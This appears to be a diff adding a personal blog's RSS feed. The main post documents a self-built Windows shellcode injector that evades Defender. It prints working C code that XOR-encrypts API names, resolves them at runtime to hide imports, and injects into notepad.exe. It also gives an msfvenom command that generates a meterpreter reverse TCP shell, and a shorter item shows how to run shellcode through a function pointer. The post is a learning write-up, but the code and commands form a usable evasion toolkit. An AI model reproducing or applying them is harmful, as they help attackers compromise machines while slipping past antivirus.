+<p>Around this last month I have been digging into the Malware Development world. I have always wanted to expand my knowledge within this field, and I felt like it was the moment to do so.</p>
+<p>As mentioned in many other blogposts, <a href="https://www.google.com/search?client=firefox-b-d&amp;q=sektor7+malware+development">Sektor7 Malware Development Essentials</a> course was a good point to start. Nevertheless, I found this course very short and I felt like most of the important concepts are ignored (e.g., <strong>what is a handle?</strong>) and are just used like if I already know them.</p>
+<p>Because of that, I actually recommend <strong>take a little stop on each of the things that the course shows you in order to UNDERSTAND what does each line do</strong> and also do some personal research on each of the things that the course provides.</p>
+<p>I personally made questions like:</p>
+<ul>
+<li>What are the parameters of this function?</li>
+<li>Why is this function called in the code?</li>
+<li>How could I develop this in a way that it could be more stealthy?</li>
+<li>What are these compile options?</li>
+</ul>
+<p>I wanted to make sure that I really learnt from this course and compiling and execute the code they give you is not the way to do it. I personally recommend to watch their videos, take some notes, and reproduce and execute the code in your personal project files. <strong>Do not be scared to improve or modify the code they give you if you think that can be useful.</strong></p>
+<p>The result of following these steps was a final course project in which I included all of the techniques given in the course to avoid detection (mainly static detection, it is a basic course) <strong>combined with am extra technique that made me bypass Windows Defender sandbox analysis.</strong></p>
+<p>Please note that I have just started to learn about these things and that I can be wrong; feel free to contact me at any of my social media to improve the quality of this post and my content overall.</p>
+<h2 id="evasive-loaderinjector">Evasive? loader/injector</h2>
+<p>The final project consists on a <strong>shellcode loader/injector (let&rsquo;s use injector from now on)</strong>.
+This shellcode injector <strong>is able to bypass Windows Defender with a meterpreter x64 shellcode at the day of this post (2024/03/05) with Cloud Protection enabled.</strong></p>
+<p><strong>EDIT</strong>: A week after this post was created, the dropper is not anymore evasive and is detected (dinamically) by Defender. I personally thought that this dropper is not stealthy enough to be evasive and a lot of evasive measures can (and will) be added to this dropper in the future. This has just started :P</p>
+<p>This injector has the following properties:</p>
+<ul>
+<li>It is an executable (.EXE) program. No DLL version for now.</li>
+<li>The shellcode is stored as a resource AND &ldquo;encrypted&rdquo; using XOR.</li>
+<li>The Windows API calls are calculated in run-time using the <a href="https://learn.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking">Run-Time Dynamic Linking</a> technique. This corresponds to the <a href="https://unprotect.it/technique/api-obfuscation/">API obfuscation technique</a> from my fellas of Unprotect Project.</li>
+<li>The strings to calculate the pointer to the API functions using the aforementioned technique are also encrypted with the same XOR key used for the shellcode, in order to obfuscate the strings.</li>
+<li>The XOR key is also stored as a resource in the executable.</li>
+<li>The program in which it injects into is <code>notepad.exe</code>. The injector obtains the PID given the process name and uses the PID to inject into.</li>
+<li>The program is compiled as a <strong>Windows Subsystem program</strong>, and not as a console program, in order to avoid a CMD popping on screen when the dropper gets executed.</li>
+</ul>
+<p>The API calls performed in this executable are simple:</p>
+<ul>
+<li><code>FindResource</code> and <code>LoadResource</code> to obtain the embedded resources in the executable.</li>
+<li><code>VirtualAlloc</code>, <code>RtlMoveMemory</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>VirtualProtectEx</code> and <code>CreateRemoteThread</code> for the injection technique.</li>
+<li><code>GetProcAddress</code> and <code>GetModuleHandle</code> to perform the IAT hiding technique.</li>
+<li><code>CreateToolhelp32Snapshot</code>, <code>Process32First</code> and <code>Process32Next</code> to obtain the PID given a process name.</li>
+</ul>
+<p>The injector has the following phases:</p>
+<ul>
+<li>It starts obtaining the XOR key from the resources section of the file.</li>
+<li>Using this key to decrypt the string names of the API calls, uses the relevant API functions to obtain the PID from the process name specified as a variable. The process name is hardcoded into the program <strong>as a real malware would do; otherwise, we would need to call this dropper with arguments (not a real case most of the time).</strong> Notepad.exe was used as an example, but it could be performed with more common processes as explorer.exe. Just modify the process name variable inside the dropper.</li>
+<li>The dropper allocates memory in <strong>its own process space and stores the shellcode embedded as a resource in this memory region. Note that the shellcode is stored in this region but not executed, as this is an intermediate step to then move the shellcode to the target process.</strong></li>
+<li>Using this obtained PID, the injector opens a handle to the process with the given PID and allocates memory space within the process region. The shellcode is then moved from the region that was previously created to this region.</li>
+<li>A remote thread pointing to the remote memory region containing the shellcode is started.</li>
+</ul>
+<p>The result is a thread in the remote process executing our shellcode.</p>
+<h2 id="finding-pid-given-process-name">Finding PID given process name</h2>
+<p>The used Windows API functions to perform the process injection technique require the PID of the process to inject into. A function that dinamically obtains the PID of a given process name at runtime was implemented in the injector using some of the Windows API calls.</p>
+<p>The function is the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">findMyProc</span>(<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span> procname) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	HANDLE hSnapshot; <span style="color:#75715e">// Handle to the system process snapshot.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	PROCESSENTRY32 pe;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	BOOL hResult;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Searching for the process %ls to get its PID...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, procname);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// snapshot of all processes in the system
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> CreateToolhelp32SnapshotEncrypted[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x2A</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0xAB</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x6D</span>, <span style="color:#ae81ff">0xBE</span>, <span style="color:#ae81ff">0x0C</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0xF3</span>, <span style="color:#ae81ff">0xCB</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0xBA</span>, <span style="color:#ae81ff">0xCF</span>, <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x3B</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0xA2</span>, <span style="color:#ae81ff">0xB3</span> };
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">XOR</span>(CreateToolhelp32SnapshotEncrypted, <span style="color:#66d9ef">sizeof</span>(CreateToolhelp32SnapshotEncrypted), key, key_len);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">auto</span> <span style="color:#66d9ef">const</span> pCreateToolhelp32Snapshot <span style="color:#f92672">=</span> reinterpret_cast<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">LPVOID</span>(WINAPI<span style="color:#f92672">*</span>)(DWORD dwFlags, DWORD th32ProcessID)<span style="color:#f92672">&gt;</span>(
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">GetProcAddress</span>(hKernel32, (LPCSTR)CreateToolhelp32SnapshotEncrypted)
+</span></span><span style="display:flex;"><span>		);
+</span></span><span style="display:flex;"><span>	hSnapshot <span style="color:#f92672">=</span> <span style="color:#a6e22e">pCreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hSnapshot <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// It is neccesary to initialize the size of the process entry.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">/* Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32). If you do not initialize dwSize,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	Process32First fails (https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32) */</span>
+</span></span><span style="display:flex;"><span>	pe.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32W);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Retrieve infrormation about first process encountered in a system snapshot
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> Process32FirstWEncrypted[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0xA1</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x7B</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0xD9</span>, <span style="color:#ae81ff">0xCA</span>, <span style="color:#ae81ff">0xF6</span>, <span style="color:#ae81ff">0x79</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xFC</span>, <span style="color:#ae81ff">0x88</span> };
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">XOR</span>(Process32FirstWEncrypted, <span style="color:#66d9ef">sizeof</span>(Process32FirstWEncrypted), key, key_len);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">auto</span> <span style="color:#66d9ef">const</span> pProcess32FirstW <span style="color:#f92672">=</span> reinterpret_cast<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">BOOL</span>(WINAPI<span style="color:#f92672">*</span>)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)<span style="color:#f92672">&gt;</span>(
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">GetProcAddress</span>(hKernel32, (LPCSTR)Process32FirstWEncrypted)
+</span></span><span style="display:flex;"><span>		);
+</span></span><span style="display:flex;"><span>	hResult <span style="color:#f92672">=</span> <span style="color:#a6e22e">pProcess32FirstW</span>(hSnapshot, <span style="color:#f92672">&amp;</span>pe);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Get information about the obtained process using its handle
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// and exit if unsuccessful
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> Process32NextWEncrypted[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0xA1</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x7B</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0xD1</span>, <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0xFC</span>, <span style="color:#ae81ff">0x7E</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0xAB</span> };
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">XOR</span>(Process32NextWEncrypted, <span style="color:#66d9ef">sizeof</span>(Process32NextWEncrypted), key, key_len);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">auto</span> <span style="color:#66d9ef">const</span> pProcess32NextW <span style="color:#f92672">=</span> reinterpret_cast<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">BOOL</span>(WINAPI<span style="color:#f92672">*</span>)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)<span style="color:#f92672">&gt;</span>(
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">GetProcAddress</span>(hKernel32, (LPCSTR)Process32NextWEncrypted)
+</span></span><span style="display:flex;"><span>		);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">pProcess32NextW</span>(hSnapshot, <span style="color:#f92672">&amp;</span>pe)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">lstrcmpW</span>(pe.szExeFile, procname) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>			pid <span style="color:#f92672">=</span> pe.th32ProcessID;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Close the open handle; we don&#39;t need it anymore
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">CloseHandle</span>(hSnapshot);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> pid;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Note that this function <strong>will return the first PID occurrence related to the process specified; if there are two process called notepad.exe, it will return the first one that is found in the snapshot obtained calling <code>CreateToolhelp32Snapshot</code></strong> (a lot of factors influence in the first returned PID).</p>
+<h2 id="evasion-techniques">Evasion techniques</h2>
+<p>Here is a detailed overview of each of the things I implemented in the program to make it stealthier, both statically and dinamically. Overall, I think that it is missing a lot of evasion techniques but as I repeated before, I am just learning slowly to know what I am exactly doing without copypasting.</p>
+<h3 id="windows-subsystem">Windows Subsystem</h3>
+<p>The program is compiled specifying <code>WINDOWS</code> as the subsystem and not <code>CONSOLE</code> as the subsystem in order to avoid the OS allocating a console when the file is executed.
+In order to do this, we first need to compile the file specifying <code>WINDOWS</code> as the <code>SUBSYSTEM</code> FLAG:</p>
+<p><img src="/images/post_images/firststeps_1.png" alt=""></p>
+<p>After that, the linker will not search for the main function; instead, it will search for the following function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> WINAPI <span style="color:#a6e22e">WinMain</span>(HINSTANCE,HISTANCE,LPSTR,<span style="color:#66d9ef">int</span>);
+</span></span></code></pre></div><p>Therefore we must replace our main function with WinMain:
+<img src="/images/post_images/firststeps_2.png" alt=""></p>
+<h3 id="iat-hiding--encrypted-strings">IAT hiding + encrypted strings</h3>
+<p>The API calls are resolved dinamically, therefore, not appearing in the IAT of the file.
+Let&rsquo;s see the snippet of the code to obfuscate an API call:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// VirtualAllocEx\0 char array encrypted with the XOR key
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> VirtualAllocExEncrypted[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x3F</span>, <span style="color:#ae81ff">0xDF</span>, <span style="color:#ae81ff">0xBC</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x0C</span>, <span style="color:#ae81ff">0xF3</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0xE7</span>, <span style="color:#ae81ff">0x4F</span>, <span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0xAB</span> };
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Decrypting the string
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">XOR</span>(VirtualAllocExEncrypted, <span style="color:#66d9ef">sizeof</span>(VirtualAllocExEncrypted), key, key_len);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Obtaining the pointer to the VirtualAllocEx function at runtime
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">auto</span> <span style="color:#66d9ef">const</span> pVirtualAllocEx <span style="color:#f92672">=</span> reinterpret_cast<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">LPVOID</span>(WINAPI<span style="color:#f92672">*</span>)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)<span style="color:#f92672">&gt;</span>(
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">GetProcAddress</span>(<span style="color:#a6e22e">GetModuleHandle</span>(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>), (LPCSTR)VirtualAllocExEncrypted)
+</span></span><span style="display:flex;"><span>		);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Calling the function using the pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	lpBufferAddress <span style="color:#f92672">=</span> <span style="color:#a6e22e">pVirtualAllocEx</span>(hOpenProcess, NULL, shellcode_len, (MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+</span></span></code></pre></div><p>The string is encrypted to not use GetProcAddress and insert the hardcoded &ldquo;<code>VirtualAllocEx</code>&rdquo; function name. <strong>This would result in the function name appearing as a string in the file.</strong>
+Given this technique, PE analyzers do not display any information about these calls in the IAT nor in the strings. We can see an example with PExplorer, in which none of the used imports is being shown in the IAT:</p>
+<p><img src="/images/post_images/firststeps.png" alt=""></p>
+<p>Also, strings related to these calls do not appear in the <code>strings</code> section:</p>
+<p><img src="/images/post_images/firststeps_3.png" alt=""></p>
+<h2 id="analyzing-the-loader-with-threatcheck">Analyzing the loader with ThreatCheck</h2>
+<p><a href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a> is an interesting tool designed by RastaMouse that allows us to <strong>pinpoint the exact bytes that Windows Defender will flag</strong> when scanning the file.</p>
+<p>We can use this tool with our loader to verify if Defender flags our file:
+<img src="/images/post_images/firststeps_5.png" alt=""></p>
+<p>We can see that at first sight Defender does not seem to detect our loader.</p>
+<h2 id="used-shellcode">Used shellcode</h2>
+<p>The used shellcode is generated from <code>msfvenom</code> and it is a meterpreter reverse TCP shell. The shellcode used is <strong>staged</strong> and that means that it is lighter, but there is a download of the rest of the shellcode after the initial shellcode has been executed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom --platform windows --arch x64 -p windows/x64/meterpreter_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.0.143 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f raw -o meterpreter EXITFUNC<span style="color:#f92672">=</span>thread
+</span></span></code></pre></div><h2 id="defender-bypass-poc">Defender Bypass PoC</h2>
+<p>Here is a video using this injector to load the previous shellcode with Defender on. Note that all of the functionalities of Defender are activated but the automatic sample submission (for obvious reasons):</p>
+<p><code><video class="video-shortcode" preload="auto" width="100%" controls>
+  <source src="/images/post_videos/firststeps_poc.webm" type="video/webm" >
+  There should have been a video here but your browser does not seem
+  to support it.
+</video></code></p>
+<p>We can see that no console is being displayed and that it looks stealthy.</p>
+<h2 id="future-research-areas">Future research areas</h2>
+<p>This post is just the start of a big project I have in hand. The main objective of my project is to understand how OS (specially Windows) works, and how EDR solutions work, in order to understand the most advanced EDR evasion techniques and how can I implement my own techniques to evade EDR using the OS facilities.</p>
+<p>I will update this injector when I discover more techniques, but here are some of the possible upgrade areas:</p>
+<ul>
+<li>Change the injected shellcode for a custom one (IMHO I am far far away from developing a custom shellcode, but I am sure I will do it at the end)</li>
+<li>Change the encryption algorithm used to a stronger one (RC6, for example).</li>
+<li>Develop the injector in another language (C#, go, nim&hellip;).</li>
+<li>Obtain the key to decrypt the resources from a server; this way, without proper connection to the server the injected shellcode does not work (ideal for EDRs that have a offline sandbox environment).</li>
+<li>Overall, use more advanced evasion techniques (indirect syscalls, for example).</li>
+</ul>
+<p>I will start soon Sektor7 Malware Development Intermediate course and start reading Windows Internals book, to complement my knowledge.</p>
+<p>I hope you liked reading my post, feel free to contact me at any of my socials for any question/aclaration or just to give me tips, and I hope we see each other soon!</p>
+<p><em><strong>jasco</strong></em></p>
+]]></description>
+      
+    </item>
+    
+    
+    
+    <item>
+      <title>Random stuff</title>
+      <link>http://localhost:1313/posts/random_stuff/</link>
+      <pubDate>Wed, 28 Feb 2024 20:53:30 +0100</pubDate>
+      
+      <guid>http://localhost:1313/posts/random_stuff/</guid>
+      <description><![CDATA[<p>Custom function declaration. Used when hooking, to get a pointer to the original function to get it dinamically resolved via IAT and then override this pointer, or to craft a new function that points to a shellcode with the function behavior (used in reflective DLL shellcode)</p>
+<p><strong>Case of getting the function pointer to a resolving Windows API call:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">// Declaring the function pointer to a resolving Windows API call
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> (WINAPI<span style="color:#f92672">*</span> pToUnicodeEx) (UINT wVirtKey,  UINT wScanCode, <span style="color:#66d9ef">const</span> BYTE <span style="color:#f92672">*</span>lpKeyState, LPWSTR pwszBuff, <span style="color:#66d9ef">int</span> cchBuff, UINT wFlags, HKL dwhkl) <span style="color:#f92672">=</span> ToUnicodeEx;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Call the function using its pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>pToUnicodeEx(wVirtKey, wScanCode, lpKeyState, pwszBuff, cchBuff, wFlags, dwhkl);
+</span></span></code></pre></div><p><strong>Case of getting the function pointer to a memory zone where the function is implemented via shellcode:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">// Declaring the function pointer to a resolving Windows API call
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">DWORD</span> (WINAPI <span style="color:#f92672">*</span> EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Declaring the function pointer instance to NULL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>EXECUTEX64 pExecuteX64   <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Allocating function for the function pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>pExecuteX64 <span style="color:#f92672">=</span> (EXECUTEX64)VirtualAlloc( NULL, <span style="color:#66d9ef">sizeof</span>(sh_executex64), MEM_RESERVE<span style="color:#f92672">|</span>MEM_COMMIT, PAGE_READWRITE );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Copying the shellcode to the function pointer location
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>memcpy( pExecuteX64, sh_executex64, sh_executex64_len );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Call the function using its pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>pExecuteX64( pX64function, (DWORD)ctx );
+</span></span></code></pre></div>]]></description>
+      
+    </item>
+    
+    
+  </channel>
+</rss>
